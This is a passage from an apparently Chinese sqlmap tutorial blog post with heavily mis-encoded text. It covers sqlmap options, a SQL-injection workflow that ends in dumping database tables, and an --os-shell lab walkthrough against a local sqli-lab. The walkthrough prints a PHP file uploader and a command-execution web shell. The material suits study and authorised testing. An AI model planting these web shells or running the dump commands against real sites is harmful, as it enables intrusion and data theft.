class="line">â€“msf-<span class="built_in">path</span>=MSFPATH Metasploit Framework æœ¬åœ°çš„å®‰è£…è·¯å¾„</span><br><span class="line">â€“tmp-<span class="built_in">path</span>=TMPPATH è¿œç¨‹ä¸´æ—¶æ–‡ä»¶ç›®å½•çš„ç»å¯¹è·¯å¾„</span><br></pre></td></tr></table></figure><h4 id="os-shellçš„ä½¿ç”¨"><a href="#os-shellçš„ä½¿ç”¨" class="headerlink" title="-os-shellçš„ä½¿ç”¨"></a><code>-os-shell</code>çš„ä½¿ç”¨</h4><p><a href="https://xz.aliyun.com/t/7942">https://xz.aliyun.com/t/7942</a></p><p><a href="https://blog.csdn.net/qq_61237064/article/details/124154956">https://blog.csdn.net/qq_61237064/article/details/124154956</a></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ä½¿ç”¨å‰æ</span><br><span class="line"></span><br><span class="line">æ‹¥æœ‰ç½‘ç«™çš„å†™å…¥æƒé™</span><br><span class="line"></span><br><span class="line">Secure_file_privå‚æ•°ä¸ºç©ºæˆ–è€…ä¸ºæŒ‡å®šè·¯å¾„</span><br></pre></td></tr></table></figure><p>æ»¡è¶³æ¡ä»¶å</p><h4 id="1-æ³¨å…¥"><a href="#1-æ³¨å…¥" class="headerlink" title="1.æ³¨å…¥"></a>1.æ³¨å…¥</h4><p>å…ˆå¯¹æ³¨å…¥ç‚¹æ¢æµ‹</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http:<span class="regexp">//</span><span class="number">127.0</span>.<span class="number">0.1</span><span class="regexp">/sqli-lab/</span>less-<span class="number">1</span>/?id=<span class="number">1</span><span class="string">&quot;</span></span><br></pre></td></tr></table></figure><p><img src="/2023/02/13/sqlmap/image-20221112150328026.png" alt="image-20221112150328026"></p><p>ç„¶åæ‰§è¡Œ<code>--os-shell</code></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http:<span class="regexp">//</span><span class="number">127.0</span>.<span class="number">0.1</span><span class="regexp">/sqli-lab/</span>less-<span class="number">1</span>/?id=<span class="number">1</span><span class="string">&quot; --os-shell</span></span><br></pre></td></tr></table></figure><p><img src="/2023/02/13/sqlmap/image-20221112150107492.png" alt="image-20221112150107492"></p><p>é€‰æ‹©phpè¯­è¨€</p><p><img src="/2023/02/13/sqlmap/image-20221112151004965.png" alt="image-20221112151004965"></p><p>æ¥ç€è¿™ä¸ªå‚æ•°æ˜¯é€‰æ‹©ç»å¯¹è·¯å¾„</p><p><img src="/2023/02/13/sqlmap/image-20221112151019786.png" alt="image-20221112151019786"></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">é€‰é¡¹ä¸€ä¸ºç”¨è¿™å‡ ä¸ªè·¯å¾„</span><br><span class="line"></span><br><span class="line">é€‰é¡¹äºŒä¸ºç”¨æˆ·è‡ªå·±è¾“å…¥</span><br><span class="line"></span><br><span class="line">é€‰é¡¹ä¸‰ä¸ºç”¨ç”¨æˆ·çš„å­—å…¸</span><br><span class="line"></span><br><span class="line">é€‰é¡¹å››ä¸ºçˆ†ç ´ã€‚</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬æ»¡è¶³å‰æçš„è¯ï¼Œé€‰æ‹©2ï¼Œç›´æ¥è¾“å…¥è‡ªå·±çŸ¥é“çš„è·¯å¾„</p><p><img src="/2023/02/13/sqlmap/image-20221112151155258.png" alt="image-20221112151155258"></p><p>åˆ°è¿™å°±å®Œæˆäº†<code>--os-shell</code>çš„æ‰§è¡Œï¼Œæ¥çœ‹çœ‹åœ¨<code>sqlmap</code>çš„æ‰§è¡Œæ•ˆæœ</p><p><img src="/2023/02/13/sqlmap/image-20221112151239878.png" alt="image-20221112151239878"></p><p>å¯¹äºä¸Šä¼ çš„ä¸¤ä¸ªæ–‡ä»¶<code>tmpugvzq.php</code>å’Œ<code>tmpbylqf.php</code>æˆ‘ä»¬åœ¨æ•°æ®åŒ…ä¸­å°±å¯ä»¥çœ‹åˆ°ï¼Œåªéœ€è¦è§£ç å°±å¯ä»¥å¾—åˆ°å†…å®¹</p><p><code>tmpugvzq.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>x<span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&quot;upload&quot;</span>]))&#123;</span><br><span class="line"><span class="variable">$dir</span>=<span class="variable">$_REQUEST</span>[<span class="string">&quot;uploadDir&quot;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">phpversion</span>()&lt;<span class="string">&#x27;4.1.0&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$file</span>=<span class="variable">$HTTP_POST_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">@<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$HTTP_POST_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>],<span class="variable">$dir</span>.<span class="string">&quot;/&quot;</span>.<span class="variable">$file</span>) <span class="keyword">or</span> <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$file</span>=<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">@<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>],<span class="variable">$dir</span>.<span class="string">&quot;/&quot;</span>.<span class="variable">$file</span>) <span class="keyword">or</span> <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line">@<span class="title function_ invoke__">chmod</span>(<span class="variable">$dir</span>.<span class="string">&quot;/&quot;</span>.<span class="variable">$file</span>,<span class="number">0755</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;File uploaded&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;form action=&quot;</span>.<span class="variable">$_SERVER</span>[<span class="string">&quot;PHP_SELF&quot;</span>].<span class="string">&quot; method=POST enctype=multipart/form-data&gt;&lt;input type=hidden name=MAX_FILE_SIZE value=1000000000&gt;&lt;b&gt;sqlmap file uploader&lt;/b&gt;&lt;br&gt;&lt;input name=file type=file&gt;&lt;br&gt;to directory: &lt;input type=text name=uploadDir value=C:\\Users\\zhang\\Desktop\\php\\PHPTutorial\\WWW\\sqli-master\\Less-1\\&gt; &lt;input type=submit name=upload value=upload&gt;&lt;/form&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æ ¹æ®ä¸Šé¢çš„<code>mysql</code>è¯­å¥ï¼Œä¸éš¾çœ‹å‡ºè¿™æ˜¯åˆ©ç”¨<code>into outfile</code>å†™å…¥æ–‡ä»¶</p><p><code>tmpbylqf.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$c</span>=<span class="variable">$_REQUEST</span>[<span class="string">&quot;cmd&quot;</span>];</span><br><span class="line">@<span class="title function_ invoke__">set_time_limit</span>(<span class="number">0</span>);</span><br><span class="line">@<span class="title function_ invoke__">ignore_user_abort</span>(<span class="number">1</span>);</span><br><span class="line">@<span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;max_execution_time&quot;</span>,<span class="number">0</span>);</span><br><span class="line"><span class="variable">$z</span>=@<span class="title function_ invoke__">ini_get</span>(<span class="string">&quot;disable_functions&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$z</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$z</span>=<span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/[, ]+/&quot;</span>,<span class="string">&#x27;,&#x27;</span>,<span class="variable">$z</span>);</span><br><span class="line">        <span class="variable">$z</span>=<span class="title function_ invoke__">explode</span>(<span class="string">&#x27;,&#x27;</span>,<span class="variable">$z</span>);</span><br><span class="line">        <span class="variable">$z</span>=<span class="title function_ invoke__">array_map</span>(<span class="string">&quot;trim&quot;</span>,<span class="variable">$z</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$z</span>=<span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$c</span>.<span class="string">&quot; 2&gt;&amp;1\n&quot;</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"><span class="variable">$n</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$z</span>;<span class="keyword">return</span> <span class="title function_ invoke__">is_callable</span>(<span class="variable">$n</span>)<span class="keyword">and</span>!<span class="title function_ invoke__">in_array</span>(<span class="variable">$n</span>,<span class="variable">$z</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">f</span>(<span class="string">&quot;system&quot;</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">ob_start</span>();</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>);</span><br><span class="line">    <span class="variable">$w</span>=<span class="title function_ invoke__">ob_get_clean</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span>(<span class="title function_ invoke__">f</span>(<span class="string">&quot;proc_open&quot;</span>))&#123;</span><br><span class="line">    <span class="variable">$y</span>=<span class="title function_ invoke__">proc_open</span>(<span class="variable">$c</span>,<span class="keyword">array</span>(<span class="keyword">array</span>(pipe,r),<span class="keyword">array</span>(pipe,w),<span class="keyword">array</span>(pipe,w)),<span class="variable">$t</span>);</span><br><span class="line">    <span class="variable">$w</span>=<span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">while</span>(!<span class="title function_ invoke__">feof</span>(<span class="variable">$t</span>[<span class="number">1</span>]))&#123;</span><br><span class="line">        <span class="variable">$w</span>.=<span class="title function_ invoke__">fread</span>(<span class="variable">$t</span>[<span class="number">1</span>],<span class="number">512</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    @<span class="title function_ invoke__">proc_close</span>(<span class="variable">$y</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span>(<span class="title function_ invoke__">f</span>(<span class="string">&quot;shell_exec&quot;</span>))&#123;</span><br><span class="line">    <span class="variable">$w</span>=<span class="title function_ invoke__">shell_exec</span>(<span class="variable">$c</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span>(<span class="title function_ invoke__">f</span>(<span class="string">&quot;passthru&quot;</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">ob_start</span>();</span><br><span class="line">    <span class="title function_ invoke__">passthru</span>(<span class="variable">$c</span>);</span><br><span class="line">    <span class="variable">$w</span>=<span class="title function_ invoke__">ob_get_clean</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span>(<span class="title function_ invoke__">f</span>(<span class="string">&quot;popen&quot;</span>))&#123;</span><br><span class="line">    <span class="variable">$x</span>=<span class="title function_ invoke__">popen</span>(<span class="variable">$c</span>,r);</span><br><span class="line">    <span class="variable">$w</span>=<span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_resource</span>(<span class="variable">$x</span>))&#123;</span><br><span class="line">        <span class="keyword">while</span>(!<span class="title function_ invoke__">feof</span>(<span class="variable">$x</span>))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="variable">$w</span>.=<span class="title function_ invoke__">fread</span>(<span class="variable">$x</span>,<span class="number">512</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        @<span class="title function_ invoke__">pclose</span>(<span class="variable">$x</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">elseif</span>(<span class="title function_ invoke__">f</span>(<span class="string">&quot;exec&quot;</span>))&#123;</span><br><span class="line">        <span class="variable">$w</span>=<span class="keyword">array</span>();</span><br><span class="line">        <span class="title function_ invoke__">exec</span>(<span class="variable">$c</span>,<span class="variable">$w</span>);</span><br><span class="line">        <span class="variable">$w</span>=<span class="title function_ invoke__">join</span>(<span class="title function_ invoke__">chr</span>(<span class="number">10</span>),<span class="variable">$w</span>).<span class="title function_ invoke__">chr</span>(<span class="number">10</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$w</span>=<span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span><span class="string">&quot;&lt;pre&gt;<span class="subst">$w</span>&lt;/pre&gt;&quot;</span>;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>è¿™æ˜¯ä¸€ä¸ªç”¨äºå‘½ä»¤æ‰§è¡Œçš„ä»£ç ï¼Œå‘½ä»¤æ‰§è¡Œåä¼šå°†æ‰§è¡Œçš„ç»“æœè¾“å‡ºã€‚</p><p>ç›´æ¥åœ¨ç½‘ç«™è®¿é—®è¿™ä¸¤ä¸ª<code>shell</code>æ–‡ä»¶å°±å¯ä»¥çœ‹åˆ°äº†</p><p>ä¸€ä¸ªæä¾›äº†ä¸€ä¸ªä¸Šä¼ æ–‡ä»¶çš„å…¥å£ï¼Œä¸€ä¸ªæä¾›äº†ä¸€ä¸ªä»¥<code>cmd</code>å‚æ•°çš„å‘½ä»¤æ‰§è¡Œçª—å£</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">æˆåŠŸåä¼šåœ¨ç½‘ç«™ç»å¯¹è·¯å¾„ä¸‹ï¼Œç”Ÿæˆä¸¤ä¸ªæ–‡ä»¶ï¼Œä¸€ä¸ªå¯ä»¥ä¸Šä¼ ï¼Œä¸€ä¸ªå¯ä»¥æ‰§è¡Œå‘½ä»¤ã€‚</span><br><span class="line"></span><br><span class="line">tmpugvzq.phpæ˜¯å¯ä»¥ä¸Šä¼ </span><br><span class="line">tmpbylqf.phpæ˜¯å¯ä»¥æ‰§è¡Œå‘½ä»¤</span><br></pre></td></tr></table></figure><p>ã€å¦‚æœæ²¡çœ‹åˆ°ï¼Œå¯ä»¥æŸ¥çœ‹<code>wireshark</code>æˆ–è€…å…ˆ<code>bp</code>æŠ“åŒ…æ•°æ®æµå¹¶æ—¶åˆ»å¼€å¯ç›‘å¬ã€‘</p><p><strong>è¿™ä¸ªæ—¶å€™sqlmapä¸»è¦åšäº†ä¸‰ä»¶äº‹æƒ…ï¼š</strong></p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>ã€è¿›è¡Œç›®æ ‡çš„ä¸€ä¸ªåŸºç¡€ä¿¡æ¯çš„æ¢æµ‹ã€‚</span><br><span class="line"><span class="number">2</span>ã€ä¸Šä¼ <span class="keyword">shell</span>åˆ°ç›®æ ‡webç½‘ç«™ä¸Šã€‚</span><br><span class="line"><span class="number">3</span>ã€é€€å‡ºæ—¶åˆ é™¤<span class="keyword">shell</span>ã€‚</span><br></pre></td></tr></table></figure><h4 id="2-Database"><a href="#2-Database" class="headerlink" title="2.Database"></a>2.Database</h4><p>æ•°æ®åº“æ”¯æŒå¤–è¿ï¼Œé€šè¿‡<code>Sqlmap</code>æ‰§è¡Œ<code>--os-shell</code>è·å–<code>shell</code>ã€‚</p><p>å¿…è¦æ¡ä»¶ï¼š</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">æ•°æ®åº“æ”¯æŒå¤–è¿</span><br><span class="line"></span><br><span class="line">æ•°æ®åº“æƒé™ä¸º<span class="keyword">SA</span>æƒé™</span><br></pre></td></tr></table></figure><p><code>Mysql</code>å’Œ<code>sqlsever</code>ä¸¤è€…çš„æƒ…å†µä¸åŒï¼Œè¯¦ç»†å»ºè®®çœ‹æ–‡ç« å­¦ä¹ </p><h3 id="Windows-æ³¨å†Œè¡¨è®¿é—®"><a href="#Windows-æ³¨å†Œè¡¨è®¿é—®" class="headerlink" title="Windows æ³¨å†Œè¡¨è®¿é—®"></a>Windows æ³¨å†Œè¡¨è®¿é—®</h3><p>è¿™äº›é€‰é¡¹å¯ä»¥è¢«ç”¨æ¥è®¿é—®åç«¯æ•°æ®åº“ç®¡ç†ç³»ç»ŸWindows æ³¨å†Œè¡¨ã€‚</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">â€“reg-read è¯»ä¸€ä¸ªWindows æ³¨å†Œè¡¨é¡¹å€¼</span><br><span class="line">â€“reg-<span class="built_in">add</span> å†™ä¸€ä¸ªWindows æ³¨å†Œè¡¨é¡¹å€¼æ•°æ®</span><br><span class="line">â€“reg-del åˆ é™¤Windows æ³¨å†Œè¡¨é”®å€¼</span><br><span class="line">â€“<span class="attribute">reg-key</span>=REGKEY Windows æ³¨å†Œè¡¨é”®</span><br><span class="line">â€“<span class="attribute">reg-value</span>=REGVAL Windows æ³¨å†Œè¡¨é¡¹å€¼</span><br><span class="line">â€“<span class="attribute">reg-data</span>=REGDATA Windows æ³¨å†Œè¡¨é”®å€¼æ•°æ®</span><br><span class="line">â€“<span class="attribute">reg-type</span>=REGTYPE Windows æ³¨å†Œè¡¨é¡¹å€¼ç±»å‹</span><br></pre></td></tr></table></figure><h3 id="Generalï¼ˆä¸€èˆ¬ï¼‰"><a href="#Generalï¼ˆä¸€èˆ¬ï¼‰" class="headerlink" title="Generalï¼ˆä¸€èˆ¬ï¼‰"></a>Generalï¼ˆä¸€èˆ¬ï¼‰</h3><p>è¿™äº›é€‰é¡¹å¯ä»¥ç”¨æ¥è®¾ç½®ä¸€äº›ä¸€èˆ¬çš„å·¥ä½œå‚æ•°ã€‚</p><figure class="highlight fortran"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">-t TRAFFICFILE è®°å½•æ‰€æœ‰ HTTP æµé‡åˆ°ä¸€ä¸ªæ–‡æœ¬æ–‡ä»¶ä¸­</span><br><span class="line">-s SESSIONFILE ä¿å­˜å’Œæ¢å¤æ£€ç´¢ä¼šè¯æ–‡ä»¶çš„æ‰€æœ‰æ•°æ®</span><br><span class="line">â€“<span class="keyword">flush</span>-session åˆ·æ–°å½“å‰ç›®æ ‡çš„ä¼šè¯æ–‡ä»¶</span><br><span class="line">â€“fresh-queries å¿½ç•¥åœ¨ä¼šè¯æ–‡ä»¶ä¸­å­˜å‚¨çš„æŸ¥è¯¢ç»“æœ</span><br><span class="line">â€“eta æ˜¾ç¤ºæ¯ä¸ªè¾“å‡ºçš„é¢„è®¡åˆ°è¾¾æ—¶é—´</span><br><span class="line">â€“update æ›´æ–° SqlMap</span><br><span class="line">â€“<span class="keyword">save</span> <span class="keyword">file</span> ä¿å­˜é€‰é¡¹åˆ° INI é…ç½®æ–‡ä»¶</span><br><span class="line">â€“batch ä»ä¸è¯¢é—®ç”¨æˆ·è¾“å…¥ï¼Œä½¿ç”¨æ‰€æœ‰é»˜è®¤é…ç½®ã€‚</span><br></pre></td></tr></table></figure><h3 id="Miscellaneousï¼ˆæ‚é¡¹"><a href="#Miscellaneousï¼ˆæ‚é¡¹" class="headerlink" title="Miscellaneousï¼ˆæ‚é¡¹"></a>Miscellaneousï¼ˆæ‚é¡¹</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">â€“beep å‘ç° SQL æ³¨å…¥æ—¶æé†’</span><br><span class="line">â€“check-payload IDS å¯¹æ³¨å…¥ payloads çš„æ£€æµ‹æµ‹è¯•</span><br><span class="line">â€“cleanup sqlmap.py å…·ä½“çš„ UDF å’Œè¡¨æ¸…ç† DBMS</span><br><span class="line">â€“forms å¯¹ç›®æ ‡ URL çš„è§£æå’Œæµ‹è¯•å½¢å¼</span><br><span class="line">â€“gpage=GOOGLEPAGE ä»æŒ‡å®šçš„é¡µç ä½¿ç”¨è°·æ­Œ dork ç»“æœ</span><br><span class="line">â€“page-rank Google dork ç»“æœæ˜¾ç¤ºç½‘é¡µæ’åï¼ˆPRï¼‰</span><br><span class="line">â€“parse-errors ä»å“åº”é¡µé¢è§£ææ•°æ®åº“ç®¡ç†ç³»ç»Ÿçš„é”™è¯¯æ¶ˆæ¯</span><br><span class="line">â€“replicate å¤åˆ¶è½¬å‚¨çš„æ•°æ®åˆ°ä¸€ä¸ª sqlite3 æ•°æ®åº“</span><br><span class="line">â€“tor ä½¿ç”¨é»˜è®¤çš„ Torï¼ˆVidalia<span class="regexp">/ Privoxy/</span> Polipoï¼‰ä»£ç†åœ°å€</span><br><span class="line">â€“wizard ç»™åˆçº§ç”¨æˆ·çš„ç®€å•å‘å¯¼ç•Œé¢</span><br></pre></td></tr></table></figure><h3 id="åˆ¶å®šæµ‹è¯•çš„ç§ç±»"><a href="#åˆ¶å®šæµ‹è¯•çš„ç§ç±»" class="headerlink" title="åˆ¶å®šæµ‹è¯•çš„ç§ç±»"></a>åˆ¶å®šæµ‹è¯•çš„ç§ç±»</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">â€“<span class="attribute">technique</span>=TECH SQLæ³¨å…¥æŠ€æœ¯æµ‹è¯•ï¼ˆé»˜è®¤ BEUSTï¼‰</span><br><span class="line">Techniquesï¼ˆæŠ€å·§ï¼‰ï¼š</span><br><span class="line">â€“technique æµ‹è¯•æŒ‡å®šæ³¨å…¥ç±»å‹ä½¿ç”¨çš„æŠ€æœ¯</span><br></pre></td></tr></table></figure><p>ä¸åŠ å‚æ•°é»˜è®¤æµ‹è¯•æ‰€æœ‰æ³¨å…¥æŠ€æœ¯:</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">B:</span> åŸºäºå¸ƒå°”çš„ SQL ç›²æ³¨</span><br><span class="line"><span class="symbol">E:</span> åŸºäºæ˜¾é”™ sql æ³¨å…¥</span><br><span class="line"><span class="symbol">U:</span> åŸºäº UNION æ³¨å…¥</span><br><span class="line"><span class="symbol">S:</span> å å±‚ sql æ³¨å…¥</span><br><span class="line"><span class="symbol">T:</span> åŸºäºæ—¶é—´ç›²æ³¨</span><br></pre></td></tr></table></figure><h3 id="sqlmap-åˆ¤æ–­waf"><a href="#sqlmap-åˆ¤æ–­waf" class="headerlink" title="sqlmap åˆ¤æ–­waf"></a>sqlmap åˆ¤æ–­waf</h3><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://www.test.com/&quot;</span> <span class="params">--identify-waf</span> <span class="params">--batch</span></span><br></pre></td></tr></table></figure><h2 id="ä¸€èˆ¬æ³¨å…¥æµç¨‹"><a href="#ä¸€èˆ¬æ³¨å…¥æµç¨‹" class="headerlink" title="ä¸€èˆ¬æ³¨å…¥æµç¨‹"></a>ä¸€èˆ¬æ³¨å…¥æµç¨‹</h2><p>ä»¥mysqlä¸ºä¾‹</p><p>1.éªŒè¯æ³¨å…¥</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u â€œæ³¨å…¥ç‚¹<span class="built_in">URL</span>â€</span><br></pre></td></tr></table></figure><p>ä»ä¸­å¯ä»¥å‘ç°å­˜åœ¨æ³¨å…¥çš„ç±»å‹ï¼Œæ•°æ®åº“ç±»å‹å’Œwebåº”ç”¨ç¨‹åºPHPå’ŒApacheç­‰ç‰ˆæœ¬ä¿¡æ¯ã€‚</p><p>2.åˆ—ä¸¾æ•°æ®åº“å</p><figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">sqlmap</span> -<span class="string">u</span> <span class="string">&quot;æ³¨å…¥ç‚¹&quot;</span> <span class="built_in">--dbs</span></span><br><span class="line"><span class="string">sqlmap</span> -<span class="string">u</span> <span class="string">&quot;æ³¨å…¥ç‚¹&quot;</span> <span class="built_in">--current-db</span>  <span class="comment">#åˆ—ä¸¾å½“å‰ä½¿ç”¨çš„æ•°æ®åº“</span></span><br></pre></td></tr></table></figure><p>3.æŸ¥è¯¢æŸä¸€æ•°æ®åº“çš„æ‰€æœ‰è¡¨å</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;æ³¨å…¥ç‚¹&quot;</span> -D æ•°æ®åº“å <span class="comment">--tables</span></span><br></pre></td></tr></table></figure><p>4.åˆ—ä¸¾è¿™ä¸€æ•°æ®åº“çš„è¡¨çš„æ‰€æœ‰åˆ—ï¼ˆå­—æ®µï¼‰</p><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;æ³¨å…¥ç‚¹&quot;</span> -D æ•°æ®åº“å -<span class="built_in">T</span> è¡¨å --<span class="built_in">columns</span></span><br></pre></td></tr></table></figure><p>5.æš´å­—æ®µå†…å®¹</p><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">sqlmap</span> <span class="operator">-</span><span class="variable">u</span> <span class="string">&quot;æ³¨å…¥ç‚¹&quot;</span> <span class="operator">-</span><span class="built_in">D</span> æ•°æ®åº“å <span class="operator">-</span><span class="variable">T</span> è¡¨å <span class="operator">-</span><span class="built_in">C</span> <span class="string">&quot;è¦çˆ†çš„å­—æ®µå&quot;</span> <span class="operator">--</span><span class="variable">dump</span></span><br></pre></td></tr></table></figure><p>çˆ†ä¸€ä¸ªå­—æ®µçš„è¯å¯èƒ½ä¼šå¾ˆæ…¢æˆ–è€…å‡ºé”™ï¼Œå…¨éƒ¨æš´å‡ºæœ€å¥½ã€‚</p><p>å¯ä»¥åœ¨åé¢åŠ ä¸ª â€“batch 